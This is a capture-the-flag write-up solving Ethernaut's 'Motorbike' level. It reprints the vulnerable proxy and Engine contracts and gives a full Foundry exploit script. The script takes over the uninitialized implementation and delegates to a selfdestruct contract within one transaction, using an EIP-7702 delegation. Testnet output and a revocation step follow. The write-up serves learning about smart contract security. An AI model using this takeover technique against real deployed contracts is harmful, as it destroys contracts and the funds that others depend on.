---
layout: post
title: "[Ethernaut] 25.Motorbike"
tags: blockchain ethernaut foundry sellfdestruct delegatecall EIP-6780 EIP-7702 signAndAttachDelegation computeCreateAddress
---

# Analysis

---

The goal is “`selfdestruct` its engine and make the motorbike unusable”.

```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    struct AddressSlot {
        address value;
    }

    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`.
    // Will run if no other function in the contract matches the call data
    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(address newImplementation, bytes memory data) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");

        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

# Exploit

---

## Attempted Solution

The goal was to `selfdestruct` the Engine. Leveraging the fact that the Engine contract was uninitialized, I executed the Engine's `initialize()` function to claim the `upgrader` role. Then, I invoked `upgradeToAndCall()` to trigger the self-destruct, but I was unable to solve the challenge.

To understand the solution requirements, I examined the Level instance code:

```solidity
function 0xd38def5b(address varg0, address varg1) public nonPayable { 
    require(msg.data.length - 4 >= 64);
    return bool(!(_createInstance[varg0]).code.size);
}
```

I found the `validateInstance()` function, which is executed when submitting the instance.

![Image etherscan]({{site.url}}/images/2026-01-17-Motorbike/etherscan.png)
![Image 4bytes]({{site.url}}/images/2026-01-17-Motorbike/4bytes.png)

Checks if the Engine contract's `code.size` is 0.

<aside>
💡

Warning (5159): "selfdestruct" has been deprecated. Note that, starting from the Cancun hard fork, the underlying opcode no longer deletes the code and data associated with an account and only transfers its Ether to the beneficiary, unless executed in the same transaction in which the contract was created (see EIP-6780). Any use in newly deployed contracts is strongly discouraged even if the new behavior is taken into account. Future changes to the EVM might further reduce the functionality of the opcode.

</aside>

This is the warning message displayed in Foundry when executing `selfdestruct`.

As indicated by the warning, there is an exception when the operation is executed within a transaction. I leveraged this exception to solve the challenge.

First, I deployed an Ex Contract containing a `selfdestruct` function to be delegated to the Engine. Exploiting the fact that the Engine Contract was uninitialized, I claimed the `upgrader` role. Finally, I used `upgradeToAndCall()` to delegate execution to the Ex Contract, triggering the `selfdestruct`.

## Deploying the Assist Contract

```solidity
contract Ex {
    function ex() public {
        selfdestruct(payable(tx.origin));
    }
}

contract Sol {

    function solve(Ethernaut ethernaut, address level, address _eg) public {
        ethernaut.createLevelInstance(Level(level));
        Engine(_eg).initialize();
        Engine(_eg).upgradeToAndCall(address(new Ex()), abi.encodeWithSignature("ex()"));
    }
}
```

`ethernaut.createLevelInstance(Level(level))` is the function that runs when you click the "Get new instance" button on Ethernaut. 
You can check the full details [here](https://sepolia.etherscan.io/address/0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6#code).

```solidity
    function createLevelInstance(Level _level) public payable {
        // Ensure level is registered.
        require(registeredLevels[address(_level)], "This level doesn't exists");

        // Get level factory to create an instance.
        address instance = _level.createInstance{value: msg.value}(msg.sender);

        // Store emitted instance relationship with player and level.
        emittedInstances[instance] = EmittedInstanceData(
            msg.sender,
            _level,
            false
        );

        statistics.createNewInstance(instance, address(_level), msg.sender);

        // Retrieve created instance via logs.
        emit LevelInstanceCreatedLog(msg.sender, instance, address(_level));
    }
```

## Delegating to the Sol contract

```solidity
Sol sol = new Sol();
uint256 pk = uint256(vm.parseBytes32(vm.promptSecret("private key")));
vm.signAndAttachDelegation(address(sol), pk);
```

After deploying the Sol contract, I executed the `signAndAttachDelegation()` function using the private key.

The `signAndAttachDelegation()` function utilizes EIP-7702 features to sign an authorization, allowing the contract to be delegated to a wallet address.

I used this function specifically to address the requirements of `submitLevelInstance()`.

```solidity
    function submitLevelInstance(address payable _instance) public {
        // Get player and level.
        EmittedInstanceData storage data = emittedInstances[_instance];
        require(
            data.player == msg.sender,
            "This instance doesn't belong to the current user"
        ); // instance was emitted for this player
        require(data.completed == false, "Level has been completed already"); // not already submitted

        // Have the level check the instance.
        if (data.level.validateInstance(_instance, msg.sender)) {
            // Register instance as completed.
            data.completed = true;

            statistics.submitSuccess(
                _instance,
                address(data.level),
                msg.sender
            );
            // Notify success via logs.
            emit LevelCompletedLog(msg.sender, _instance, address(data.level));
        } else {
            statistics.submitFailure(
                _instance,
                address(data.level),
                msg.sender
            );
        }
    }
```

The `submitLevelInstance()` function, which is executed when the "Submit instance" button is clicked, retrieves `emittedInstances[_instance]` to verify if the instance was registered by `msg.sender`. 

This results in a failure when attempting to submit the solution to the Ethernaut site.

## Obtaining the Motorbike and Engine Contract addresses

The following outlines the process of determining the Motorbike and Engine Contract addresses.

Although the goal is to reduce the Engine Contract's code size to 0, the `createLevelInstance()` function:

```solidity
    function createLevelInstance(Level _level) public payable {
        // Ensure level is registered.
        require(registeredLevels[address(_level)], "This level doesn't exists");

        // Get level factory to create an instance.
        address instance = _level.createInstance{value: msg.value}(msg.sender);

        // Store emitted instance relationship with player and level.
        emittedInstances[instance] = EmittedInstanceData(
            msg.sender,
            _level,
            false
        );

        statistics.createNewInstance(instance, address(_level), msg.sender);

        // Retrieve created instance via logs.
        emit LevelInstanceCreatedLog(msg.sender, instance, address(_level));
    }
```

does not return any values. Furthermore, since the exploit must occur within a single transaction, event logs are inaccessible, making it necessary to manually calculate the contract addresses.

As observed in the challenge and Level instance code:

```solidity
// Decompiled by library.dedaub.com
// 2026.01.17 06:27 UTC
// Compiled using the solidity compiler version 0.6.12

// Data structures and variables inferred from the use of storage instructions
mapping (address => address) _createInstance; // STORAGE[0x1]
address _owner; // STORAGE[0x0] bytes 0 to 19

// Events
OwnershipTransferred(address, address);

function transferOwnership(address newOwner) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    require(_owner == msg.sender, Error('Ownable: caller is not the owner'));
    require(newOwner, Error('Ownable: new owner is the zero address'));
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
}

function fallback() public payable { 
    revert();
}

function renounceOwnership() public nonPayable { 
    require(_owner == msg.sender, Error('Ownable: caller is not the owner'));
    emit OwnershipTransferred(_owner, 0);
    _owner = 0;
}

function createInstance(address _hub) public payable { 
    require(msg.data.length - 4 >= 32);
    MEM[v220V0x8c.data:v220V0x8c.data + 1353] = 0x608060405234801561001057600080fd5b50610529806100206000396000f3fe60806040526004361061003f5760003560e01c80634f1ef28614610044578063564f6d71146100fc5780638129fc1c14610123578063af26974514610138575b600080fd5b6100fa6004803603604081101561005a57600080fd5b6001600160a01b03823516919081019060408101602082013564010000000081111561008557600080fd5b82018360208201111561009757600080fd5b803590602001918460018302840111640100000000831117156100b957600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600092019190915250929550610169945050505050565b005b34801561010857600080fd5b5061011161017f565b60408051918252519081900360200190f35b34801561012f57600080fd5b506100fa610185565b34801561014457600080fd5b5061014d61025c565b604080516001600160a01b039092168252519081900360200190f35b610171610271565b61017b82826102d8565b5050565b60015481565b600054610100900460ff168061019e575061019e6103e4565b806101ac575060005460ff16155b6101e75760405162461bcd60e51b815260040180806020018281038252602e815260200180610499602e913960400191505060405180910390fd5b600054610100900460ff16158015610212576000805460ff1961ff0019909116610100171660011790555b6103e8600155600080547fffffffffffffffffffff0000000000000000000000000000000000000000ffff163362010000021790558015610259576000805461ff00191690555b50565b6000546201000090046001600160a01b031681565b6000546201000090046001600160a01b031633146102d6576040805162461bcd60e51b815260206004820152600d60248201527f43616e2774207570677261646500000000000000000000000000000000000000604482015290519081900360640190fd5b565b6102e1826103f5565b80511561017b576000826001600160a01b0316826040518082805190602001908083835b602083106103245780518252601f199092019160209182019101610305565b6001836020036101000a038019825116818451168082178552505050505050905001915050600060405180830381855af49150503d8060008114610384576040519150601f19603f3d011682016040523d82523d6000602084013e610389565b606091505b50509050806103df576040805162461bcd60e51b815260206004820152600b60248201527f43616c6c206661696c6564000000000000000000000000000000000000000000604482015290519081900360640190fd5b505050565b60006103ef30610492565b15905090565b6103fe81610492565b6104395760405162461bcd60e51b815260040180806020018281038252602d8152602001806104c7602d913960400191505060405180910390fd5b7f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc80547fffffffffffffffffffffffff0000000000000000000000000000000000000000166001600160a01b0392909216919091179055565b3b15159056fe496e697469616c697a61626c653a20636f6e747261637420697320616c726561647920696e697469616c697a6564455243313936373a206e657720696d706c656d656e746174696f6e206973206e6f74206120636f6e7472616374a264697066735822122007424dee2c3970da4b44a842c5d8a06a97751da3c8c268eeecaa2569e32a9f3964736f6c634300060c0033;
    v0 = create.code(v1.data, 1353).value(0);
    if (bool(v0)) {
        MEM[v24eV0x8c.data:v24eV0x8c.data + 705] = 0x608060405234801561001057600080fd5b506040516102c13803806102c18339818101604052602081101561003357600080fd5b5051610049816101d1602090811b61007017901c565b6100845760405162461bcd60e51b815260040180806020018281038252602d815260200180610294602d913960400191505060405180910390fd5b806100ae7f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc6101d7565b80546001600160a01b039283166001600160a01b031990911617905560408051600481526024810182526020810180516001600160e01b031663204a7f0760e21b1781529151815160009486169382918083835b602083106101215780518252601f199092019160209182019101610102565b6001836020036101000a038019825116818451168082178552505050505050905001915050600060405180830381855af49150503d8060008114610181576040519150601f19603f3d011682016040523d82523d6000602084013e610186565b606091505b50509050806101ca576040805162461bcd60e51b815260206004820152600b60248201526a10d85b1b0819985a5b195960aa1b604482015290519081900360640190fd5b50506101da565b3b151590565b90565b60ac806101e86000396000f3fe60806040526048602d7f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc604a565b5473ffffffffffffffffffffffffffffffffffffffff16604d565b005b90565b3660008037600080366000845af43d6000803e808015606b573d6000f35b3d6000fd5b3b15159056fea2646970667358221220ca7b336654cd29640f3df95da5dc17f0facf369b8d4692675b71665674d682be64736f6c634300060c0033455243313936373a206e657720696d706c656d656e746174696f6e206973206e6f74206120636f6e7472616374;
        v2 = create.code(v3.data, 737).value(0);
        if (bool(v2)) {
            _createInstance[address(v2)] = v0;
            if (this.balance >= 0) {
                if (bool(v2.code.size)) {
                    v4 = v5 = MEM[64];
                    v6 = v7 = 96 + MEM[64];
                    while (v8 >= 32) {
                        MEM[v4] = MEM[v6];
                        v8 = v8 - 32;
                        v4 += 32;
                        v6 += 32;
                    }
                    MEM[v4] = MEM[v6] & ~((uint8.max + 1) ** (32 - v8) - 1) | MEM[v4] & (uint8.max + 1) ** (32 - v8) - 1;
                    v9, /* uint256 */ v10, /* uint256 */ v11, /* uint256 */ v12 = address(v2).upgrader().gas(msg.gas);
                    if (RETURNDATASIZE() == 0) {
                        v13 = v14 = 96;
                    } else {
                        v13 = v15 = new bytes[](RETURNDATASIZE());
                        RETURNDATACOPY(v15.data, 0, RETURNDATASIZE());
                    }
                    if (!v9) {
                        require(!MEM[v13], v12, MEM[v13]);
                        v16 = new bytes[](v17.length);
                        v18 = v19 = 0;
                        while (v18 < v17.length) {
                            v16[v18] = v17[v18];
                            v18 += 32;
                        }
                        if (30) {
                            MEM[v16.data] = bytes30('Address: low-level call failed');
                        }
                        revert(Error(v16));
                    } else {
                        require(keccak256(MEM[32 + v784_0x1V0x62cV0x5e4V0x284V0x8c:32 + v784_0x1V0x62cV0x5e4V0x284V0x8c + MEM[v784_0x1V0x62cV0x5e4V0x284V0x8c]]) == keccak256(this), Error('Wrong upgrader address'));
                        if (this.balance >= 0) {
                            if (bool(v2.code.size)) {
                                v20 = v21 = MEM[64];
                                v22 = v23 = 96 + MEM[64];
                                while (v24 >= 32) {
                                    MEM[v20] = MEM[v22];
                                    v24 = v24 - 32;
                                    v20 += 32;
                                    v22 += 32;
                                }
                                MEM[v20] = MEM[v22] & ~((uint8.max + 1) ** (32 - v24) - 1) | MEM[v20] & (uint8.max + 1) ** (32 - v24) - 1;
                                v25, /* uint256 */ v26, /* uint256 */ v27, /* uint256 */ v28 = address(v2).call(0x564f6d7100000000000000000000000000000000000000000000000000000000 | uint224(MEM[MEM[64] + 96])).gas(msg.gas);
                                if (RETURNDATASIZE() == 0) {
                                    v29 = v30 = 96;
                                } else {
                                    v29 = v31 = new bytes[](RETURNDATASIZE());
                                    RETURNDATACOPY(v31.data, 0, RETURNDATASIZE());
                                }
                                if (!v25) {
                                    require(!MEM[v29], v28, MEM[v29]);
                                    v32 = new bytes[](v33.length);
                                    v34 = v35 = 0;
                                    while (v34 < v33.length) {
                                        v32[v34] = v33[v34];
                                        v34 += 32;
                                    }
                                    if (30) {
                                        MEM[v32.data] = bytes30('Address: low-level call failed');
                                    }
                                    revert(Error(v32));
                                } else {
                                    require(keccak256(MEM[32 + v784_0x1V0x62cV0x5e4V0x39dV0x8c:32 + v784_0x1V0x62cV0x5e4V0x39dV0x8c + MEM[v784_0x1V0x62cV0x5e4V0x39dV0x8c]]) == keccak256(1000), Error('Wrong horsePower'));
                                    return address(v2);
                                }
                            } else {
                                MEM[MEM[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000;
                                MEM[MEM[64] + 4] = 32;
                                revert(Error('Address: call to non-contract'));
                            }
                        } else {
                            MEM[MEM[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000;
                            MEM[4 + MEM[64]] = 32;
                            revert(Error('Address: insufficient balance for call'));
                        }
                    }
                } else {
                    MEM[MEM[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000;
                    MEM[MEM[64] + 4] = 32;
                    revert(Error('Address: call to non-contract'));
                }
            } else {
                MEM[MEM[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000;
                MEM[4 + MEM[64]] = 32;
                revert(Error('Address: insufficient balance for call'));
            }
        } else {
            RETURNDATACOPY(0, 0, RETURNDATASIZE());
            revert(0, RETURNDATASIZE());
        }
    } else {
        RETURNDATACOPY(0, 0, RETURNDATASIZE());
        revert(0, RETURNDATASIZE());
    }
}

function owner() public nonPayable { 
    return _owner;
}

function 0xd38def5b(address varg0, address varg1) public nonPayable { 
    require(msg.data.length - 4 >= 64);
    return bool(!(_createInstance[varg0]).code.size);
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function __function_selector__( function_selector) public payable { 
    MEM[64] = 128;
    if (msg.data.length < 4) {
        fallback();
    } else if (0x8da5cb5b > function_selector >> 224) {
        if (0x715018a6 == function_selector >> 224) {
            renounceOwnership();
        } else {
            require(0x7726f776 == function_selector >> 224);
            createInstance(address);
        }
    } else if (0x8da5cb5b == function_selector >> 224) {
        owner();
    } else if (0xd38def5b == function_selector >> 224) {
        0xd38def5b();
    } else {
        require(0xf2fde38b == function_selector >> 224);
        transferOwnership(address);
    }
}

```

the Engine Contract is deployed first, and its address is then passed to the Motorbike Contract's constructor for initialization.

While there is a standard formula for deriving the address of a deployed contract, Foundry's `computeCreateAddress()` function makes it easy to calculate.

```solidity
uint256 nonce = vm.getNonce(address(level));
Motorbike mb_ = Motorbike(payable(vm.computeCreateAddress(address(level), nonce+1)));
Engine eg_ = Engine(vm.computeCreateAddress(address(level), nonce));
```

## Executing the Contract

Finally, simply execute the Contract.

```solidity
Sol(msg.sender).solve(ethernaut, address(level), address(eg_));
console.log("Motorbike: ", address(mb_));
console.log("Engine: ", address(eg_));
console.log("code size: ", _getCodeSize(address(eg_)));
```

## Complete Exploit Script

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Ethernaut.sol";
import "forge-std/Script.sol";

interface Motorbike {
    function _getAddressSlot(bytes32 slot) external pure returns (address);
    function _delegate(address implementation) external;
}

interface Engine {
    function upgrader() external view returns (address);
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external;
}

contract Ex {
    function ex() public {
        selfdestruct(payable(tx.origin));
    }
}

contract Sol {

    function solve(Ethernaut ethernaut, address level, address _eg) public {
        ethernaut.createLevelInstance(Level(level));
        Engine(_eg).initialize();
        Engine(_eg).upgradeToAndCall(address(new Ex()), abi.encodeWithSignature("ex()"));
    }
}

contract MotorbikeSol is Script {
    Ethernaut ethernaut = Ethernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    Level level = Level(0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6);

    function _getCodeSize(address addr) internal view returns (uint256 size) {
        assembly {
            size := extcodesize(addr)
        }
    }

    function run() external {
        vm.startBroadcast();

        Sol sol = new Sol();
        uint256 pk = uint256(vm.parseBytes32(vm.promptSecret("private key")));
        vm.signAndAttachDelegation(address(sol), pk);

        uint256 nonce = vm.getNonce(address(level));
        Motorbike mb_ = Motorbike(payable(vm.computeCreateAddress(address(level), nonce+1)));
        Engine eg_ = Engine(vm.computeCreateAddress(address(level), nonce));

        Sol(msg.sender).solve(ethernaut, address(level), address(eg_));
        console.log("Motorbike: ", address(mb_));
        console.log("Engine: ", address(eg_));
        console.log("code size: ", _getCodeSize(address(eg_)));

        vm.stopBroadcast();
    }
}
```

The complete exploit code is as follows, and executing it yields the following values.

```bash
$ forge script script/MotorbikeSol.sol:MotorbikeSol --account mingw --sender 0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514 --rpc-url sepolia --skip-simulation --isolate --broadcast
[⠊] Compiling...
No files changed, compilation skipped
private key: [hidden]
Script ran successfully.

== Logs ==
  Motorbike:  0xb6Ee323Edf5e4091239234cA66E73ec0eAc7F3Ff
  Engine:  0x8824F3ce858C01E200bF0AA8381d18393C154eAB
  code size:  0

SKIPPING ON CHAIN SIMULATION.
Enter keystore password:

##### sepolia
✅  [Success] Hash: 0xe664e9415d354643dffb4796de37f7c6df4db23667dfcfbebc18c4d63e2a6b9b
Contract Address: 0xeD2427fef1Cbb2889662DCE61250c0D4aB5CB52e
Block: 10065934
Paid: 0.0006675423286207 ETH (330850 gas * 2.017658542 gwei)

##### sepolia
✅  [Success] Hash: 0x2c3881cd7e96240ed1b563a9124ab3477beec32430e27c11b925afdad6329f28
Block: 10065935
Paid: 0.0014929189030595 ETH (754460 gas * 1.978791325 gwei)

✅ Sequence #1 on sepolia | Total Paid: 0.0021604612316802 ETH (1085310 gas * avg 1.998224933 gwei)

==========================

ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.
```

I can confirm the addresses of the Motorbike and Engine Contracts, and verify that the Engine contract's code size is 0.

## Ethernaut Submission

Now, we need to verify the solution on the Ethernaut site.

If we verify by simply clicking the "Submit Instance" button, a different contract—not the one executed in Foundry—will be submitted.

Therefore, we must manually submit using the Motorbike Contract address obtained from the Foundry output.

Go to the Motorbike challenge page, press F12, and execute the following command in the console tab.

```js
await ethereum.request({
  method: 'eth_sendTransaction',
  params: [{
    from: player,
    to: '0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6',
    data: web3.eth.abi.encodeFunctionCall(
      {
        name: 'submitLevelInstance',
        type: 'function',
        inputs: [{type: 'address', name: '_instance'}]
      },
      ['0xb6Ee323Edf5e4091239234cA66E73ec0eAc7F3Ff']
    ),
    gas: '0x200000'
  }]
})
```

This code directly executes the `submitLevelInstance()` function using the MetaMask API. Upon execution, the submission is completed via MetaMask interaction, and if you refresh the page

![Image solve]({{site.url}}/images/2026-01-17-Motorbike/solve.png)

We can confirm that the challenge has been solved.

## Revoking the Delegation

```bash
$ cast code 0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514 --rpc-url sepolia
0xef0100ed2427fef1cbb2889662dce61250c0d4ab5cb52e
```

Inspecting the wallet address reveals that the code delegation is still active.

This must be revoked, as it could be triggered when Ether is received.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

contract MotorbikeSol is Script {

    function run() external {
        vm.startBroadcast();

        uint256 pk = uint256(vm.parseBytes32(vm.promptSecret("private key")));
        vm.signAndAttachDelegation(address(0), pk);

        payable(msg.sender).transfer(0);

        vm.stopBroadcast();
    }
}
```

The process is similar to the solution steps. However, since the script will not execute without a transaction to broadcast, I triggered a dummy transaction using `payable(msg.sender).transfer(0)`.

```bash
$ cast code 0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514 --rpc-url sepolia
0x
```